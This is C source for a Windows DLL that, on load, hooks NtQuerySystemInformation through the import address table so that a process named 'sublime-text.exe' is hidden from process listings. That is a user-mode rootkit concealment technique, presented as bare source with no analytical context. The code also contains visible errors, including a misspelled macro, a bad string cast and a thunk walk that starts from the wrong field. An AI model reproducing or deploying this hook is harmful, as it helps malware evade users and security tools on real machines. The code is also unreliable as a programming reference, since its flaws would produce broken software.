#define _CRT_SECUE_NO_WARNINGS

#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>

#define STATUS_SUCCESS ((NTSTATUS)0X0000000L)

typedef struct _MY_SYSTEM_PROCESS_INFORMATON {
	ULONG				NextEntryOffset;
	ULONG				NumberOfThreads;
	LARGE_INTEGER		Reserved[3];
	LARGE_INTEGER		CreateTime;
	LARGE_INTEGER		UserTime;
	LARGE_INTEGER		KernelTime;
	UNICODE_STRING		ImageName;
	ULONG				BasePriority;
	HANDLE				ProcessId;
	HANDLE				InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
	__in			SYSTEM_INFORMATION_CLASS    SystemInformationClass,
	__inout			PVOID						SystemInformation,
	__in			ULONG						SystemInformationLength,
	__out_opt		PULONG						ReturnLength
	);

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle((LPCWSTR)"ntdll"), "NtQuerySystemInformation");

NTSTATUS WINAPI HookedNtQuerySystemInfo(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
) {
	// Call original process to get it's status
	NTSTATUS status = OriginalNtQuerySystemInformation(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength
		);

	// Check for success
	if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status) {

		// Declare process information structures
		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;
		
		do {

			pCurrent = pNext;
			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
			
			// Check the next until completion
			if (!wcsncmp(pNext->ImageName.Buffer, L"sublime-text.exe", pNext->ImageName.Length)) {
				if (!pNext->NextEntryOffset)
					pCurrent->NextEntryOffset = 0;
				else
					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
			}
		} while (pCurrent->NextEntryOffset != 0); // conditional statement
	}
	return status;
}

void StartHook() {

	/*
		Find the base of our module. Grab module and fill modinfo struct using module infomration.

		typedef struct _MODULEINFO {
		    LPVOID lpBaseOfDll;
		    DWORD SizeOfImage;
		    LPVOID EntryPoint;
		} MODULEINFO, *LPMODULEINFO;

		HMODULE WINAPI GetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);
		BOOL WINAPI GetModuleInformation(_In_ HANDLE hProcess, _In_ HMODULE hModule, _Out_ LPMODULEINFO lpmodinfo, _In_ DWORD cb);
	*/
	MODULEINFO modInfo = { 0 };
	HMODULE hModule = GetModuleHandle(0);

	GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));
	
	// Create/Parse the PE header until section that contains infomration about imported functions/libraries
	LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll;

	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAddress;
	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(pAddress + pIDH->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER) & (pINH->OptionalHeader);
	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddress + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	
	// Look for NTDLL.DLL
	for (; pIID->Characteristics; pIID++) {
		if (!strcmp("ntdll.dll", (char*)(pAddress + pIID->Name)))
			break;
	}

	// Create structures that loop and look for the functions
	PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)(pAddress + pIID->Name);
	PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)(pAddress + pIID->FirstThunk);
	PIMAGE_IMPORT_BY_NAME pIIBM;

	for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++) {
		pIIBM = (PIMAGE_IMPORT_BY_NAME)(pAddress + pITD->u1.AddressOfData);
		if (!strcmp("NtQuerySystemInformation", (char*)pIIBM->Name))
			break;

		pFirstThunkTest++;
	}

	// Write hooked-function address into this section
	DWORD dwOld = NULL;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
	pFirstThunkTest->u1.Function = (DWORD)HookedNtQuerySystemInfo;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);

	CloseHandle(hModule);
}

bool __stdcall DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved) {

	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		StartHook();
		break;
	}

	return TRUE;
}